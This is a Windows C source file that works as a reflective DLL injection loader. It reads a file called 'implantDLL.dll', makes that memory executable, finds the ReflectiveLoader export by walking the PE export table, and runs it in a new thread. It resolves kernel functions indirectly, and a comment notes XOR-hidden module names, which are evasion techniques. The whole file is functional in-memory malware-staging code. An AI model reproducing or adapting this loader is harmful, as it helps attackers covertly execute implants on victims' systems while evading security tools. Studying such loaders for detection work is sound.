#include <Windows.h>
#include <stdio.h>

#define UTILS_IMPLEMENTATION
#include "utils.h"

LPVOID GetReflectiveLoaderFn(ULONG_PTR lpvDLLFileContents)
{
    LPVOID ReflectiveLoaderFn = NULL;

    IMAGE_DOS_HEADER *DosHeader = (IMAGE_DOS_HEADER *)lpvDLLFileContents;

    WORD *dwBitness = (lpvDLLFileContents + (DosHeader->e_lfanew + sizeof(DWORD)));
    if (*dwBitness == 0x8664)
    {
        // Assume that ReflectiveLoader is the only function exported
        PIMAGE_NT_HEADERS64 NTHeaders = (PIMAGE_NT_HEADERS64)(lpvDLLFileContents + (DosHeader->e_lfanew));

        PIMAGE_SECTION_HEADER SectionHeaders = (PIMAGE_SECTION_HEADER)((ULONG_PTR)&NTHeaders->OptionalHeader + NTHeaders->FileHeader.SizeOfOptionalHeader);
        WORD SectionCount = NTHeaders->FileHeader.NumberOfSections;
        LONG lExportDirectoryOffset = RVAToOffset(NTHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress, SectionHeaders, NTHeaders->FileHeader.NumberOfSections);

        PIMAGE_EXPORT_DIRECTORY pExportDirectory = (PIMAGE_EXPORT_DIRECTORY)(lpvDLLFileContents + lExportDirectoryOffset);

        for (DWORD f = 0; f < pExportDirectory->NumberOfFunctions; ++f)
        {
            DWORD dwFunctionAddrRVA = pExportDirectory->AddressOfFunctions + (f * sizeof(DWORD));
            LONG lFunctionAddrOffset = RVAToOffset(dwFunctionAddrRVA, SectionHeaders, SectionCount);

            DWORD dwFunctionRVA = *(DWORD *)(lpvDLLFileContents + lFunctionAddrOffset);
            LONG lFunctionoOffset = RVAToOffset(dwFunctionRVA, SectionHeaders, SectionCount);

            ReflectiveLoaderFn = (lpvDLLFileContents + lFunctionoOffset);
            break;
        }
    }
    else if (*dwBitness == 0x14c)
    {
        // Assume that ReflectiveLoader is the only function exported
        PIMAGE_NT_HEADERS32 NTHeaders = (PIMAGE_NT_HEADERS32)(lpvDLLFileContents + (DosHeader->e_lfanew));

        PIMAGE_SECTION_HEADER SectionHeaders = (PIMAGE_SECTION_HEADER)((ULONG_PTR)&NTHeaders->OptionalHeader + NTHeaders->FileHeader.SizeOfOptionalHeader);
        WORD SectionCount = NTHeaders->FileHeader.NumberOfSections;
        LONG lExportDirectoryOffset = RVAToOffset(NTHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress, SectionHeaders, NTHeaders->FileHeader.NumberOfSections);

        PIMAGE_EXPORT_DIRECTORY pExportDirectory = (PIMAGE_EXPORT_DIRECTORY)(lpvDLLFileContents + lExportDirectoryOffset);

        for (DWORD f = 0; f < pExportDirectory->NumberOfFunctions; ++f)
        {
            DWORD dwFunctionAddrRVA = pExportDirectory->AddressOfFunctions + (f * sizeof(DWORD));
            LONG lFunctionAddrOffset = RVAToOffset(dwFunctionAddrRVA, SectionHeaders, SectionCount);

            DWORD dwFunctionRVA = *(DWORD *)(lpvDLLFileContents + lFunctionAddrOffset);
            LONG lFunctionoOffset = RVAToOffset(dwFunctionRVA, SectionHeaders, SectionCount);

            ReflectiveLoaderFn = (lpvDLLFileContents + lFunctionoOffset);
            break;
        }
    }

    return ReflectiveLoaderFn;
}

int main()
{
    int iRetVal = 0;

    HMODULE lpvKernelDLL = MyGetKernelModuleHandle();
    if (lpvKernelDLL == NULL)
    {
        printf("Could not find kernel module handle\n");
        iRetVal = 1;
        goto shutdown;
    }

    PopulateKernelFunctionPtrsByName(lpvKernelDLL);

    OFSTRUCT OpenBuff = {0};
    HANDLE hImplantDLL = (HANDLE)pOpenFile("implantDLL.dll", &OpenBuff, OF_READ);
    if (hImplantDLL == HFILE_ERROR)
    {
        printf("implantDLL not found\n");
        iRetVal = 2;
        goto shutdown;
    }

    DWORD dwFileSize = pGetFileSize(hImplantDLL, NULL);

    LPVOID lpvDLLFileContents = pVirtualAlloc(NULL, dwFileSize, MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE);

    if (lpvDLLFileContents == NULL)
    {
        printf("VirtualAlloc failed with %d\n", pGetLastError());
        iRetVal = 3;
        goto shutdown;
    }

    if (!pReadFile(hImplantDLL, lpvDLLFileContents, dwFileSize, NULL, NULL))
    {
        printf("Read File failed with %d\n", pGetLastError());
        iRetVal = 4;
        goto shutdown;
    }

    DWORD dwOldProtect = 0;
    // execute read write because the code will unxor kernel32 ntdll file names
    if (!pVirtualProtect(lpvDLLFileContents, dwFileSize, PAGE_EXECUTE_READWRITE, &dwOldProtect))
    {
        printf("VirtualProtect failed with %d\n", pGetLastError());
        iRetVal = 5;
        goto shutdown;
    }

    LPVOID fnReflectiveLoader = GetReflectiveLoaderFn((ULONG_PTR)lpvDLLFileContents);
    if (fnReflectiveLoader == NULL)
    {
        printf("Could not find ReflectiveLoaderFn\n");
        iRetVal = 6;
        goto shutdown;
    }

    HANDLE hThread = pCreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)fnReflectiveLoader, NULL, 0, NULL);
    if (hThread != NULL)
    {
        pWaitForSingleObject(hThread, INFINITE);
        pCloseHandle(hThread);
    }

shutdown:

    if (hImplantDLL != NULL)
    {
        pCloseHandle(hImplantDLL);
    }

    if (lpvDLLFileContents != NULL)
    {
        pVirtualFree(lpvDLLFileContents, 0, MEM_RELEASE);
    }

    return 0;
}